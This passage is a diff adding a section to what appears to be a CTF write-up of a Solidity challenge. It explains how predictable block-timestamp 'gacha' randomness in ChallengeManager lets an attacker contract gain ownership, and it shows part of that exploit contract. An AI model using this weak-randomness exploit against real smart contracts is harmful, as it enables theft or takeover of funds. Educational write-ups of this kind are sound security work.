@@ -64,3 +64,78 @@ From the output, I think it is safe to assume that INJUINJUINJUSUPERKEYKEYKEYKEY
 
 ### Becoming the owner
 After looking through the functions in ChallengeManager.sol, I noticed that the only function that would allow us to become the owner was the upgradeChallengerAttribute function. 
+```solidity
+function upgradeChallengerAttribute(uint256 challengerId, uint256 strangerId) public stillSearchingChallenger {
+    ...
+    uint256 gacha = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp))) % 4;
+
+    if (gacha == 0){
+        ...
+    }else if (gacha == 1){
+        if(privileged.getRequirmenets(challengerId).isRich == false){
+            privileged.upgradeAttribute(challengerId, true, false, false, false);
+        }else if(privileged.getRequirmenets(challengerId).isImportant == false){
+            privileged.upgradeAttribute(challengerId, true, true, false, false);
+        }else if(privileged.getRequirmenets(challengerId).hasConnection == false){
+            privileged.upgradeAttribute(challengerId, true, true, true, false);
+        }else if(privileged.getRequirmenets(challengerId).hasVIPCard == false){
+            privileged.upgradeAttribute(challengerId, true, true, true, true);
+            qualifiedChallengerFound = true;
+            theChallenger = privileged.getRequirmenets(challengerId).challenger;
+        }
+    }
+    ...
+```
+Calling this function four times when gacha is 1 will make us the challenger. To accomplish this, I wrote a smart contract that would only call upgradeChallengerAttribute if `uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp))) % 4 == 1`. But first, the contract would need to become a challenger by sending 5 eth to the approach function.
+```solidity
+    function approach() public payable {
+        if(msg.value != 5 ether){
+            revert CM_NotTheCorrectValue();
+        }
+        if(approached[msg.sender] == true){
+            revert CM_AlreadyApproached();
+        }
+        approached[msg.sender] = true;
+        challenger.push(msg.sender);
+        privileged.mintChallenger(msg.sender);
+    }
+```
+This function will add our contract to the list of challengers. Since the setup contract created two challengers in its constructor, our contract's challenger id will be 3. 
+
+## Putting it all together
+Now that we have an idea of how to solve the challenge, we just need to write the contract. For most of the challenges in this CTF, I used the Remix IDE.
+
+### Importing
+```solidity
+import "./Privileged.sol";
+import "./ChallengeManager.sol";
+import "./Setup.sol";
+```
+This part should be self explanatory. We are importing the other .sol files so that our contract will be able to interact with the other contracts.
+
+### State variables
+```solidity
+    Setup public setup;
+    Privileged public privileged;
+    ChallengeManager public challengeManager;
+```
+These state variables will hold a reference to the instances of the other contracts.
+
+### Constructor
+```solidity
+    constructor(address _setup) payable {
+        require(msg.value == 5 ether, "Need 5 ETH");
+        
+        setup = Setup(_setup);
+        challengeManager = ChallengeManager(setup.challengeManager());
+        privileged = Privileged(setup.privileged());
+
+        challengeManager.approach{value: 5 ether}();
+    }
+```
+The constructor is a special function that is run once when the contract is deployed. In the constructor, I first require five ether to be sent along with the deployment for when we call approach. I define the setup with the address of the setup contract, which is passed in as _setup, and find the addresses of challengeManager and privileged through setup. Finally, I call approach with five ether, making our contract a challenger.
+
+
+
+
+
